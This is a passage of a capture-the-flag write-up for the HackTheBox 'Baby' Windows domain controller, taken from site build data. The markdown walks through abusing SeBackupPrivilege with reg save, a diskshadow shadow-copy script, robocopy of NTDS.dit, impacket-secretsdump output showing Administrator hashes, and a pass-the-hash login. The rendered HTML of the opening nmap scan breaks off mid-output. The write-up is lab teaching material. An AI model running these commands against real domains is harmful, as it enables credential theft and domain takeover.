privilege!: `SeBackupPrivilege` we can perform a copy of the `SAM`, `SYSTEM` & `NTDS` which are sensitive databases that contain juicy hashes\n\n## Abusing SeBackupPrivilege\n\nFirst, let's copy the `SAM` & `SYSTEM` onto our `C:\\Temp` folder using `reg`. These registry hives contain:\n\n* `SAM hive`: Local Security Account Manager database with local user hashes\n* `SYSTEM hive`: System boot key needed to decrypt the SAM database\n\n```powershell\n*Evil-WinRM* PS C:\\Temp> reg save HKLM\\SAM C:\\Temp\\sam.hive\nThe operation completed successfully.\n*Evil-WinRM* PS C:\\Temp> reg save HKLM\\SYSTEM C:\\Temp\\system.hive\nThe operation completed successfully.\n*Evil-WinRM* PS C:\\Temp> dir\n    Directory: C:\\Temp\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        10/24/2025   9:01 AM          49152 sam.hive\n-a----        10/24/2025   9:01 AM       20684800 system.hive\n```\n\nNow for the `NTDS.dit` - this is the Active Directory database file that contains all domain user hashes, but it's constantly locked by the `LSASS` process. We need to use *Volume Shadow Copy* Service `(VSS)` to create a snapshot while the file is in use.\n\nFirst let's create a script on our attacker machine which we can further *interpretate* with `diskshadow` to make the backup of the `NTDS`&#x20;\n\nSave this into a `script.txt` file\n\n```csharp\nset metadata C:\\Windows\\Temp\\meta.cabX\nset context clientaccessibleX\nset context persistentX\nbegin backupX\nadd volume C: alias cdriveX\ncreateX\nexpose %cdrive% E:X\nend backupX\n```\n\n**What this script does:**\n\n* Creates a shadow copy (snapshot) of the `C:` drive\n* Exposes it as `E:` drive temporarily\n* Uses backup context to bypass file locks\n\nThen upload it to the `DC`&#x20;\n\n```csharp\nupload script.txt\nInfo: Uploading /home/delorian/HackTheBox/Medium/Baby/content/script.txt to C:\\Temp\\script.txt    \nData: 232 bytes of 232 bytes copied\nInfo: Upload successful!\n```\n\n**Why this works with `SeBackupPrivilege`:**\n\n* Shadow copies allow reading locked files\n* Backup flag in `robocopy` uses `SeBackupPrivilege` to bypass `ACLs`\n* We get a clean copy of `NTDS.dit` without stopping AD service\n\n```powershell\ndiskshadow /s script.txt\n```\n\nThen let's use `robocopy` to copy the file into our `C:\\Temp` folder\n\n```bash\nrobocopy /b E:\\Windows\\ntds . ntds.dit\n```\n\nAnd there we have our three files that we will use to dump hashes!!:\n\n```\n*Evil-WinRM* PS C:\\Temp> dir\n    Directory: C:\\Temp\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        10/24/2025   8:20 AM       16777216 ntds.dit\n-a----        10/24/2025   9:01 AM          49152 sam.hive\n-a----        10/24/2025   9:05 AM            175 script.txt\n-a----        10/24/2025   9:01 AM       20684800 system.hive\n```\n\n## Dumping hashes\n\nLet's download the three files onto the attacker machine using `evil-winrm's` *download* so we can use `impacket-secretsdump` and dump all the *hashes*&#x20;\n\n```\nimpacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL | grep Administrator\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:x:::\nAdministrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4\nAdministrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d\nAdministrator:des-cbc-md5:d38cb994ae806b97\n```\n\nWe know the second one it's the correct domain *Administrator* user so we will use the hash and `PtH` using `evil-winrm` to the *DC*, this time with the *Administrator* user\n\n\u003Cfigure>\u003Cimg src=\"https://3550432212-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgxTXO9Ixrx4ExK6jnMbc%2Fuploads%2F421uXpT20xsG0ZCvntXv%2Fimage.png?alt=media&#x26;token=f3048525-232b-4947-b969-3072a6608df7\" alt=\"\">\u003Cfigcaption>\u003C/figcaption>\u003C/figure>\n\n### Conclusion\n\nThis attack chain demonstrates a classic Active Directory privilege escalation:\n\n1. **Initial Access**: Password spray → Password reset → `WinRM` access\n2. **Privilege Discovery**: Backup Operators group membership with `SeBackupPrivilege`\n3. **Credential Extraction**: Shadow copy technique to dump `NTDS.dit`\n4. **Domain Compromise**: Extract domain Administrator's *hash* for full domain control\n\nThe takeaway is that **Backup Operators** group membership is highly dangerous in *Active Directory environments*, as it allows attackers to extract the entire domain credential database through volume shadow copies, ultimately leading to complete domain compromise.","src/content/posts/baby.md","d9206d66959f13cc",{"html":289,"metadata":290},"\u003Csection>\u003Ch1 id=\"baby\">Baby\u003Ca class=\"anchor\" href=\"#baby\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h1>\u003Csection>\u003Ch2 id=\"reconnaissance\">Reconnaissance\u003Ca class=\"anchor\" href=\"#reconnaissance\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>As always, we start off by performing our regular \u003Ccode>TCP\u003C/code> scan using \u003Ccode>nmap\u003C/code>  \u003C/p>\u003Cdiv class=\"expressive-code\">\u003Clink rel=\"stylesheet\" href=\"/_astro/ec.4fsv9.css\">\u003Cscript type=\"module\" src=\"/_astro/ec.g1fg5.js\">\u003C/script>\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:86ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--privileged\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p-\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-Pn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-n\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--min-rate\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">5000\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sS\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-sCV\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-vvv\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-oN\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">scan\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.8.92\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:136ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">PORT\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">      \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">STATE\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">SERVICE\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">       \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">REASON\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">          \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">VERSION\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">53/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">domain\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Simple\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">DNS\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Plus\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">88/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">kerberos-sec\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Kerberos\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> (server \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">time:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2025-10-24\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">07:15:55Z\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">135/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">msrpc\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">139/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">netbios-ssn\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">netbios-ssn\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">389/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ldap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">          \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Active\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Directory\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> (Domain: \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">baby.vl0.,\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Site:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Default-First-Site-Name\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">445/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">microsoft-ds?\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">464/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">kpasswd5?\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">     \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">593/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ncacn_http\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">RPC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">over\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">HTTP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">1.0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">636/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">tcpwrapped\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">11\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">3268/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ldap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">          \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">syn-ack\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">ttl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Active\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Directory\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> (Domain: \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">baby.vl0.,\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Site:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Default-First-Site-Name\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">12\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">3269/tcp\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">  \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">tcpwrapped\u003C/span>\u003Cspan 